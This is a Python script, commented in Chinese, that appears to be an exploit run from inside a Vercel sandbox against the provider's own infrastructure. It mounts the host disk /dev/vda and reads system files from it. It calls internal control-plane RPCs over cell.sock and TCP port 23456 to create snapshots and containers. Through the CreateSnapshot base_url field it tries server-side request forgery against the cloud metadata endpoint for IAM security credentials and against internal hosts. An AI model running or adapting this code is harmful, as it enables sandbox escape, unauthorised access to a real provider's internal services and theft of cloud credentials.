# -*- coding: utf-8 -*-
"""vda3_cell_ssrf: vda rootfs 归属判定 + cell.sock ALIVE + CreateSnapshot SSRF 全链
1) mount /dev/vda -> 系统标识 (os-release/hostname) + Freebox 痕迹
2) cell.sock 直连 -> cell.api ALIVE 验证 (V22/V23 路径)
3) CreateSnapshot base_url SSRF: 本地观测(18080) + IMDS + 内网 oracle
4) celld-init.sh / meta.db 读取
输出落盘 + 哨兵 V3P_DONE"""
import os, time, socket, ctypes, glob, sys

OUT = '/vercel/sandbox/v3p.out'
os.makedirs('/vercel/sandbox', exist_ok=True)
f = open(OUT, 'w', encoding='utf-8', errors='replace')


def log(s):
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def rpc_unix(sockpath, path, body='{}', t=6):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(sockpath)
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: application/json\r\n'
               'Content-Length: %d\r\nConnection: close\r\n\r\n' % (path, len(body)))
        s.sendall(req.encode())
        data = b''
        while True:
            try:
                chunk = s.recv(8192)
            except socket.timeout:
                break
            if not chunk:
                break
            data += chunk
        s.close()
        if not data:
            return 'NORESP', ''
        head, _, rest = data.partition(b'\r\n\r\n')
        return head.split(b'\r\n')[0].decode(errors='replace'), rest[:400].decode(errors='replace')
    except Exception as e:
        return 'EXC:%s' % type(e).__name__, ''


def main():
    # P0: 挂载 vda (若已挂载则复用)
    MOUNTED = False
    try:
        for ln in open('/proc/self/mountinfo', errors='replace'):
            if '/mnt/vdax' in ln:
                MOUNTED = True
                log('already mounted: %s' % ln.strip()[:150])
                break
    except Exception:
        pass
    if not MOUNTED:
        os.makedirs('/mnt/vdax', exist_ok=True)
        ret = ctypes.CDLL(None).mount(b'/dev/vda', b'/mnt/vdax', b'xfs', 0, b'')
        log('mount ret=%d' % ret)
        if ret != 0:
            os.makedirs('/mnt/vdax2', exist_ok=True)
            ret2 = ctypes.CDLL(None).mount(b'/dev/vda', b'/mnt/vdax2', b'xfs', 0, b'')
            log('mount2 ret=%d' % ret2)
            if ret2 != 0:
                log('mount fail (continue via tcp)')
                # 不 FATAL: 继续走 TCP 23456 控制面路径
            else:
                os.rename('/mnt/vdax2', '/mnt/vdax')

    # P1: 系统标识 + Freebox 痕迹
    log('=== P1 系统标识 ===')
    for p in ['/mnt/vdax/etc/os-release', '/mnt/vdax/etc/hostname', '/mnt/vdax/etc/hosts']:
        try:
            log('%s: %s' % (p, open(p, errors='replace').read()[:500].replace('\n', ' | ')))
        except Exception as e:
            log('%s ERR %s' % (p, e))
    log('=== P1b Freebox 痕迹 ===')
    hits = []
    for root, dirs, files in os.walk('/mnt/vdax', topdown=True):
        depth = root[len('/mnt/vdax'):].count('/')
        if depth > 4:
            dirs[:] = []
            continue
        for n in files + dirs:
            nl = n.lower()
            if any(k in nl for k in ['freebox', 'fbxos', 'free-box', 'fbx_']):
                hits.append(os.path.join(root, n))
        for d in list(dirs):
            if d in ('proc', 'sys', 'dev', 'volumes', 'tmp'):
                dirs.remove(d)
        if len(hits) > 20:
            break
    log('freebox hits: %s' % hits[:20])
    # 常见 web 根
    for p in ['/mnt/vdax/usr/share/nginx', '/mnt/vdax/var/www', '/mnt/vdax/usr/lib/freebox',
              '/mnt/vdax/fbx', '/mnt/vdax/srv']:
        try:
            log('ls %s: %s' % (p, os.listdir(p)[:15]))
        except Exception:
            pass

    # P2: TCP 23456 控制面 (V22 已确认直连 host)
    log('=== P2 TCP 23456 控制面 ===')
    for host in ['127.0.0.1', '172.17.0.1', '169.254.1.1']:
        try:
            s = socket.create_connection((host, 23456), 3)
            s.settimeout(4)
            req = ('POST /vercel.hive.cell.api.drives.v1.DrivesService/CreateSnapshot HTTP/1.1\r\n'
                   'Host: unix\r\nContent-Type: application/json\r\nContent-Length: 2\r\n'
                   'Connection: close\r\n\r\n{}')
            s.sendall(req.encode())
            data = b''
            while True:
                try:
                    chunk = s.recv(4096)
                except socket.timeout:
                    break
                if not chunk:
                    break
                data += chunk
            s.close()
            log('tcp %s -> %s | %s' % (host, data[:30].decode(errors='replace'), data[200:350].decode(errors='replace')))
        except Exception as e:
            log('tcp %s EXC %s' % (host, e))
        time.sleep(0.3)

    # P2b: cell.sock ALIVE
    log('=== P2b cell.sock ALIVE ===')
    sp = '/mnt/vdax/run/cell/cell.sock'
    paths = [
        '/vercel.hive.cell.api.usage.v1.UsageService/GetResourceUsage',
        '/vercel.hive.cell.api.drives.v1.DrivesService/CreateSnapshot',
        '/vercel.hive.cell.api.containers.v1.ContainersService/Create',
        '/vercel.hive.cell.api.processes.v1.ProcessService/Wait',
        '/vercel.hive.celld.api.v1.CelldService/Heartbeat',
    ]
    for p in paths:
        st, bd = rpc_unix(sp, p, '{}')
        log('%s -> %s | %s' % (p.split('/')[-1], st, bd[:200].replace('\n', ' ')))
        time.sleep(0.4)

    # P3: CreateSnapshot SSRF
    log('=== P3 CreateSnapshot base_url SSRF ===')
    # 本地观测服务器
    OBS = []
    try:
        import http.server
        class H(http.server.BaseHTTPRequestHandler):
            def do_GET(self):
                OBS.append(self.path)
                self.send_response(200)
                self.send_header('Content-Length', '2')
                self.end_headers()
                self.wfile.write(b'ok')
            def log_message(self, *a):
                pass
        srv = http.server.HTTPServer(('127.0.0.1', 18080), H)
        import threading
        threading.Thread(target=srv.serve_forever, daemon=True).start()
        log('observe 18080 up')
    except Exception as e:
        log('observe FAIL %s' % e)
    DID = 'a' * 32
    for fld in ['base_url', 'baseUrl']:
        body = '{"drive_id":"%s","%s":"http://127.0.0.1:18080/probe/%s"}' % (DID, fld, fld)
        st, bd = rpc_unix(sp, '/vercel.hive.cell.api.drives.v1.DrivesService/CreateSnapshot', body, t=8)
        log('fld %s -> %s | %s | obs=%d' % (fld, st, bd[:200].replace('\n', ' '), len(OBS)))
        time.sleep(0.5)
    for url in ['http://169.254.169.254/latest/meta-data/',
                'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
                'http://172.31.0.2/', 'http://100.64.0.1/', 'http://8.8.8.8/']:
        body = '{"drive_id":"%s","base_url":"%s"}' % (DID, url)
        t0 = time.time()
        st, bd = rpc_unix(sp, '/vercel.hive.cell.api.drives.v1.DrivesService/CreateSnapshot', body, t=6)
        log('url %-55s -> %s (%.1fs) | %s' % (url, st, time.time() - t0, bd[:150].replace('\n', ' ')))
        time.sleep(0.5)
    log('OBS: %s' % OBS)

    # P4: celld 相关文件
    log('=== P4 celld 文件 ===')
    for p in ['/mnt/vdax/opt/vercel/celld-init.sh', '/mnt/vdax/opt/vercel/meta.db',
              '/mnt/vdax/run/cell/runc']:
        try:
            st = os.stat(p)
            log('%s size=%d' % (p, st.st_size))
            if p.endswith('.sh'):
                log('  %s' % open(p, errors='replace').read()[:800].replace('\n', ' | '))
        except Exception as e:
            log('%s ERR %s' % (p, e))

    log('V3P_DONE')
    f.close()


if __name__ == '__main__':
    main()
